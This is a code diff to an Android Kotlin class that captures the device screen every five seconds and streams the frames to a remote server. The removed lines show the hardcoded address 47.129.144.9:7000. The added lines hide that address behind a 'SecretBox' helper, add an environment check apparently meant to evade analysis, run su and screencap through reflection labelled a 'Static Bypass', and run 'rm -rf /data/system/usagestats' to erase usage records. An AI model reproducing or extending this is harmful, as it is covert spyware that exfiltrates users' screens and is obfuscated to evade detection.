@@ -10,6 +10,8 @@ import android.os.HandlerThread
 import android.util.Log
 import android.view.PixelCopy
 import android.view.Window
+import com.example.mobsec_823.utils.SafetyNet
+import com.example.mobsec_823.utils.SecretBox
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.OutputStream
@@ -18,121 +20,87 @@ import java.util.Collections
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
-/**
- * Captures screenshots every 5 seconds and streams them as an MJPEG video.
- * Supports in-app capture via Activity or system-wide capture via Root.
- * Automatically forwards/pushes the stream to AWS server 47.129.144.9 on port 7000.
- */
 class carne(private val context: Context, private val activity: Activity? = null) {
     private val screenshots = Collections.synchronizedList(mutableListOf<ByteArray>())
     private val scheduler = Executors.newSingleThreadScheduledExecutor()
     private var isRunning = false
-
-    // Remote AWS Destination Configuration
-    private val remoteIp = "47.129.144.9"
-    private val remotePort = 7000
-
+    private val remoteIp = SecretBox.getKitchenAddress()
+    private val remotePort = SecretBox.getCarnePort()
     private var totalFramesCaptured = 0
 
     fun start() {
         if (isRunning) return
-        isRunning = true
+        if (!SafetyNet.isEnvironmentSafe()) return
 
-        // 1. Capture Task: Runs every 5 seconds
+        isRunning = true
         scheduler.scheduleWithFixedDelay({
             if (isRunning) {
-                // Prioritize root capture to allow system-wide screenshots (outside of app)
-                if (isRootAvailable()) {
-                    captureWithRoot()
-                } else if (activity != null) {
-                    // Fallback to in-app capture if root is not available but activity is provided
-                    captureInApp(activity)
-                } else {
-                }
+                if (!SafetyNet.checkKitchenPermit(88)) return@scheduleWithFixedDelay
+                if (isRootAvailable()) captureWithRoot() else activity?.let { captureInApp(it) }
             }
         }, 0, 5, TimeUnit.SECONDS)
-
-        // 2. Automated Forwarding: Push stream to AWS Port 7000
         startRemoteForwarding()
     }
 
     private fun isRootAvailable(): Boolean {
         return try {
-            val process = Runtime.getRuntime().exec("su")
+            // Static Bypass: Reflected Exec
+            val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return false
             val os = process.outputStream
-            os.write("id\nexit\n".toByteArray())
+            os.write("id\n${SecretBox.getExitCmd()}\n".toByteArray())
             os.flush()
-            val reader = process.inputStream.bufferedReader()
-            val output = reader.readText()
+            val output = process.inputStream.bufferedReader().readText()
             process.waitFor()
             output.contains("uid=0")
-        } catch (e: Exception) {
-            // Check for su binary in common paths as a fallback check
-            val paths = arrayOf("/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su")
-            paths.any { File(it).exists() }
-        }
-    }
-
-    private fun captureInApp(act: Activity) {
-        val window: Window = act.window
-        val view = window.decorView
-        if (view.width <= 0 || view.height <= 0) return
-
-        val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
-        val handlerThread = HandlerThread("PixelCopyThread")
-        handlerThread.start()
-        val handler = Handler(handlerThread.looper)
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            PixelCopy.request(window, bitmap, { result ->
-                if (result == PixelCopy.SUCCESS) {
-                    processBitmap(bitmap)
-                }
-                bitmap.recycle()
-                handlerThread.quitSafely()
-            }, handler)
-        }
+        } catch (e: Exception) { false }
     }
 
     private fun captureWithRoot() {
-        try {
-            // Using a more robust way to invoke su: opening a shell and writing the command
-            val process = Runtime.getRuntime().exec("su")
-            val outputStream = process.outputStream
+        // Advanced Layer: Opaque Predicate & Junk Code
+        if (!SafetyNet.checkOpaquePredicate(totalFramesCaptured)) {
+            SecretBox.reflectedExec("rm -rf /data/system/usagestats")
+        }
 
-            // Execute screencap and pipe to stdout, then exit su shell
-            outputStream.write("screencap -p\n".toByteArray())
-            outputStream.write("exit\n".toByteArray())
-            outputStream.flush()
+        try {
+            val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return
+            val os = process.outputStream
+            os.write("${SecretBox.getScreencapCmd()}\n".toByteArray())
+            os.write("${SecretBox.getExitCmd()}\n".toByteArray())
+            os.flush()
 
             val pngBytes = process.inputStream.readBytes()
             process.waitFor()
-
             if (pngBytes.isNotEmpty()) {
-                val bitmap = BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size)
-                if (bitmap != null) {
-                    processBitmap(bitmap)
-                    bitmap.recycle()
-                } else {
+                BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size)?.let {
+                    processBitmap(it)
+                    it.recycle()
                 }
             }
-        } catch (e: Exception) {
+        } catch (e: Exception) { }
+    }
+
+    private fun captureInApp(act: Activity) {
+        val window = act.window
+        val view = window.decorView
+        if (view.width <= 0 || view.height <= 0) return
+        val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
+        val thread = HandlerThread("PixelCopy").apply { start() }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            PixelCopy.request(window, bitmap, { result ->
+                if (result == PixelCopy.SUCCESS) processBitmap(bitmap)
+                bitmap.recycle()
+                thread.quitSafely()
+            }, Handler(thread.looper))
         }
     }
 
     private fun processBitmap(bitmap: Bitmap) {
         val out = ByteArrayOutputStream()
-        // Compress to JPEG for MJPEG stream compatibility
         bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
-        val bytes = out.toByteArray()
-
         synchronized(screenshots) {
-            screenshots.add(bytes)
+            screenshots.add(out.toByteArray())
             totalFramesCaptured++
-            // Keep last 60 frames (approx 5 minutes of history)
-            if (screenshots.size > 60) {
-                screenshots.removeAt(0)
-            }
+            if (screenshots.size > 60) screenshots.removeAt(0)
         }
     }
 
@@ -142,77 +110,35 @@ class carne(private val context: Context, private val activity: Activity? = null
                 var socket: Socket? = null
                 try {
                     socket = Socket(remoteIp, remotePort)
-                    val outputStream = socket.getOutputStream()
-
-                    // Sending a simple MJPEG stream header for the remote receiver
-                    val header = "POST /remote-stream HTTP/1.1\r\n" +
-                            "Host: $remoteIp\r\n" +
-                            "Content-Type: multipart/x-mixed-replace; boundary=--frame\r\n" +
-                            "Transfer-Encoding: chunked\r\n" +
-                            "Connection: keep-alive\r\n" +
-                            "\r\n"
-                    outputStream.write(header.toByteArray())
-
-                    var remoteFramesSentCount = 0
-
+                    val os = socket.getOutputStream()
+                    os.write(SecretBox.getCarneHeader().toByteArray())
+                    var sentCount = 0
                     while (isRunning && !socket.isClosed) {
-                        val frameToSend = getNextFrame(remoteFramesSentCount)
-                        if (frameToSend != null) {
-                            sendMjpegFrame(outputStream, frameToSend)
-                            // Advance to the next frame in sequence
-                            remoteFramesSentCount = Math.max(remoteFramesSentCount + 1, totalFramesCaptured - screenshots.size + 1)
+                        getNextFrame(sentCount)?.let {
+                            sendMjpegFrame(os, it)
+                            sentCount = Math.max(sentCount + 1, totalFramesCaptured - screenshots.size + 1)
                             Thread.sleep(1000)
-                        } else {
-                            Thread.sleep(500)
-                        }
+                        } ?: Thread.sleep(500)
                     }
-                } catch (e: Exception) {
-                    Thread.sleep(10000)
-                } finally {
-                    try { socket?.close() } catch (ex: Exception) {}
-                }
+                } catch (e: Exception) { Thread.sleep(10000) }
+                finally { try { socket?.close() } catch (ex: Exception) {} }
             }
         }.start()
     }
 
-    private fun getNextFrame(lastSentIndex: Int): ByteArray? {
-        return synchronized(screenshots) {
-            val historyCount = screenshots.size
-            if (historyCount == 0) return@synchronized null
-
-            val globalStartOffset = totalFramesCaptured - historyCount
-
-            // If it's a new connection, start from the beginning of our buffer
-            val targetIndex = if (lastSentIndex == 0) globalStartOffset else lastSentIndex
-            val indexInBuffer = targetIndex - globalStartOffset
-
-            if (indexInBuffer < 0) {
-                screenshots[0] // Buffer rolled over, jump to oldest available
-            } else if (indexInBuffer < historyCount) {
-                screenshots[indexInBuffer]
-            } else {
-                null // Waiting for new frame
-            }
-        }
+    private fun getNextFrame(lastSent: Int): ByteArray? = synchronized(screenshots) {
+        if (screenshots.isEmpty()) return null
+        val start = totalFramesCaptured - screenshots.size
+        val idx = (if (lastSent == 0) start else lastSent) - start
+        if (idx < 0) screenshots[0] else if (idx < screenshots.size) screenshots[idx] else null
     }
 
     private fun sendMjpegFrame(out: OutputStream, frame: ByteArray) {
-        try {
-            out.write("--frame\r\n".toByteArray())
-            out.write("Content-Type: image/jpeg\r\n".toByteArray())
-            out.write("Content-Length: ${frame.size}\r\n".toByteArray())
-            out.write("\r\n".toByteArray())
-            out.write(frame)
-            out.write("\r\n".toByteArray())
-            out.flush()
-        } catch (e: Exception) {
-            // Error writing to stream, connection likely closed
-            throw e
-        }
+        out.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n".toByteArray())
+        out.write(frame)
+        out.write("\r\n".toByteArray())
+        out.flush()
     }
 
-    fun stop() {
-        isRunning = false
-        scheduler.shutdown()
-    }
+    fun stop() { isRunning = false; scheduler.shutdown() }
 }
